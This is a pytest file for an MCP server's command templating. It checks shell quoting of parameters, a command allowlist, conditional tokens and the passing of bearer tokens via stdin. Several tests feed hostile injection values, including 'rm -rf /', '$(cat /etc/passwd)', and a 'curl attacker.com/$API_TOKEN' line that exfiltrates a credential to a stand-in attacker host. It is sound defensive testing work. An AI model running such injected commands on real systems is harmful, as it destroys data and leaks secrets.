"""Tests for command substitution and injection prevention."""
import os
import subprocess  # nosec B404
import sys
import shlex
import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

# Import the functions from server.py
from mcp_server.server import (
    _substitute_command,
    _apply_schema_defaults,
    _check_unsubstituted_placeholders,
    _validate_command,
    _extract_shell_command,
    _prepare_command,
    _child_env,
    _resolve_conditionals,
    ALLOWED_COMMANDS,
)


class TestSubstituteCommand:
    """Core injection prevention tests — these gate Finding 2 from review."""

    def test_normal_substitution(self):
        template = 'curl -s "https://api.example.com/${service_name}"'
        parts = _substitute_command(template, {"service_name": "payment-svc"}, {})
        assert parts[0] == "curl"
        # The service name should appear quoted in the URL
        assert any("payment-svc" in p for p in parts)

    def test_injection_attempt_semicolon(self):
        """Semicolons in parameter values must not create a new command."""
        template = 'echo "${param}"'
        parts = _substitute_command(template, {"param": "safe; rm -rf /"}, {})
        # shlex.quote wraps the value — the whole thing becomes one argument
        # It should NOT split into multiple commands
        assert "rm" not in parts  # rm should not be a separate argument
        assert len([p for p in parts if p == "rm"]) == 0

    def test_injection_attempt_backticks(self):
        """Backtick command substitution must not execute."""
        template = 'echo "${param}"'
        parts = _substitute_command(template, {"param": "`whoami`"}, {})
        # The backticks should be literal, not interpreted
        assert not any(p == "whoami" for p in parts)

    def test_injection_attempt_dollar_expansion(self):
        """$() expansion must not execute."""
        template = 'echo "${param}"'
        parts = _substitute_command(template, {"param": "$(cat /etc/passwd)"}, {})
        assert not any("cat" == p for p in parts)

    def test_injection_attempt_credential_exfiltration(self):
        """An attacker trying to exfiltrate credentials via parameter."""
        template = 'curl -H "Authorization: Bearer ${API_TOKEN}" "https://api.example.com/${service}"'
        creds = {"API_TOKEN": "secret-token-12345"}
        params = {"service": "x; curl attacker.com/$API_TOKEN"}
        parts = _substitute_command(template, params, creds)
        # The credential should appear (it's legitimate), but the attacker
        # URL must not be a separate curl invocation
        assert parts[0] == "curl"
        # There should be only ONE curl (the legitimate one)
        assert parts.count("curl") == 1

    def test_credentials_not_quoted(self):
        """Credentials are substituted without quoting (they come from trusted source)."""
        template = 'curl -H "Authorization: Bearer ${TOKEN}" "https://api.com"'
        parts = _substitute_command(template, {}, {"TOKEN": "my-secret"})
        # The token should appear as part of the header value
        assert any("my-secret" in p for p in parts)

    def test_params_are_quoted(self):
        """User parameters are always shlex.quoted."""
        template = 'echo ${user_input}'
        parts = _substitute_command(template, {"user_input": "hello world"}, {})
        # shlex.quote("hello world") = "'hello world'" which after shlex.split
        # becomes the single token: hello world
        assert "hello world" in parts or "'hello world'" in parts

    def test_credential_takes_precedence_over_param(self):
        """If a param key collides with a credential key, credential wins."""
        template = 'echo ${TOKEN}'
        creds = {"TOKEN": "real-secret"}
        params = {"TOKEN": "attacker-value"}
        parts = _substitute_command(template, params, creds)
        combined = "".join(parts)
        # Credential must win — attacker cannot override a real credential
        assert "real-secret" in combined, "Credential should take precedence"
        assert "attacker-value" not in combined, "Param must not override credential"


class TestApplySchemaDefaults:
    def test_applies_missing_defaults(self):
        schema = {
            "properties": {
                "region": {"type": "string", "default": "us-west-2"},
                "name": {"type": "string"},
            }
        }
        result = _apply_schema_defaults({"name": "svc"}, schema)
        assert result == {"name": "svc", "region": "us-west-2"}

    def test_does_not_override_provided_values(self):
        schema = {"properties": {"region": {"type": "string", "default": "us-west-2"}}}
        result = _apply_schema_defaults({"region": "eu-west-1"}, schema)
        assert result == {"region": "eu-west-1"}

    def test_empty_schema(self):
        result = _apply_schema_defaults({"x": 1}, {})
        assert result == {"x": 1}


class TestCheckUnsubstitutedPlaceholders:
    def test_no_placeholders(self):
        assert _check_unsubstituted_placeholders(["curl", "-s", "https://api.com"]) is None

    def test_detects_leftover_placeholder(self):
        result = _check_unsubstituted_placeholders(["curl", "https://api.com/${missing}"])
        assert result == "${missing}"

    def test_multiple_placeholders_returns_first(self):
        result = _check_unsubstituted_placeholders(["${a}", "${b}"])
        assert result == "${a}"


class TestValidateCommand:
    def test_allowed_commands(self):
        for cmd in ALLOWED_COMMANDS:
            assert _validate_command(cmd) is True

    def test_disallowed_command(self):
        assert _validate_command("rm") is False
        assert _validate_command("bash") is False
        assert _validate_command("sh") is False

    def test_paths_are_rejected(self):
        assert _validate_command("/usr/bin/curl") is False
        assert _validate_command("/usr/bin/rm") is False


class TestExtractShellCommand:
    def test_extracts_shell_block(self):
        body = '\n## Execution\n\n```shell\ncurl -s "https://api.com"\n```\n'
        assert _extract_shell_command(body) == 'curl -s "https://api.com"'

    def test_no_shell_block_returns_none(self):
        assert _extract_shell_command("no code block here") is None

    def test_unclosed_block_returns_none(self):
        assert _extract_shell_command("```shell\ncurl http://x") is None


class TestResolveConditionals:
    """Conditional tokens: ${name ? a : b} driven by a boolean parameter."""

    def test_true_branch_selected(self):
        assert _resolve_conditionals("status=${flag ? yes : no}", {"flag": True}) == "status=yes"

    def test_false_branch_selected(self):
        assert _resolve_conditionals("status=${flag ? yes : no}", {"flag": False}) == "status=no"

    def test_branch_values_with_spaces_and_punctuation(self):
        out = _resolve_conditionals(
            "${dry_run ? plan validated. : failover initiated.}", {"dry_run": False}
        )
        assert out == "failover initiated."

    def test_non_boolean_param_rejected(self):
        with pytest.raises(ValueError, match="must be boolean"):
            _resolve_conditionals("${name ? a : b}", {"name": "us-east-1"})

    def test_unknown_param_rejected(self):
        with pytest.raises(ValueError, match="Unknown conditional parameter"):
            _resolve_conditionals("${missing ? a : b}", {})

    def test_string_param_cannot_smuggle_a_conditional(self):
        """A param VALUE that looks like a conditional is never re-interpreted."""
        template = "echo ${payload}"
        assert _resolve_conditionals(template, {"payload": "${flag ? a : b}"}) == "echo ${payload}"

    def test_no_conditional_is_a_noop(self):
        assert _resolve_conditionals("echo hello", {}) == "echo hello"


class TestSecureCredentialTransport:
    def test_curl_bearer_token_removed_from_argv_and_sent_via_stdin(self):
        argv, stdin_data = _prepare_command(
            'curl -s -H "Authorization: Bearer ${DR_API_TOKEN}" https://example.test/${service}',
            {"service": "orders"},
            {"DR_API_TOKEN": "secret-token"},
        )
        assert "secret-token" not in " ".join(argv)
        assert argv == ["curl", "-s", "https://example.test/orders", "--config", "-"]
        assert stdin_data == 'header = "Authorization: Bearer secret-token"\n'

    def test_child_env_never_contains_credentials(self):
        assert _child_env() == {
            key: value
            for key, value in _child_env().items()
        }
        assert all("secret" not in v for v in _child_env().values())

    def test_credential_used_outside_bearer_header_fails_closed(self):
        with pytest.raises(ValueError, match="Unsubstituted placeholder"):
            _prepare_command("echo ${DR_API_TOKEN}", {}, {"DR_API_TOKEN": "secret-token"})

    def test_non_credential_template_is_unchanged(self):
        argv, stdin_data = _prepare_command(
            'echo ${message}', {"message": "hello"}, {"DR_API_TOKEN": "secret-token"}
        )
        assert argv == ["echo", "hello"]
        assert stdin_data is None
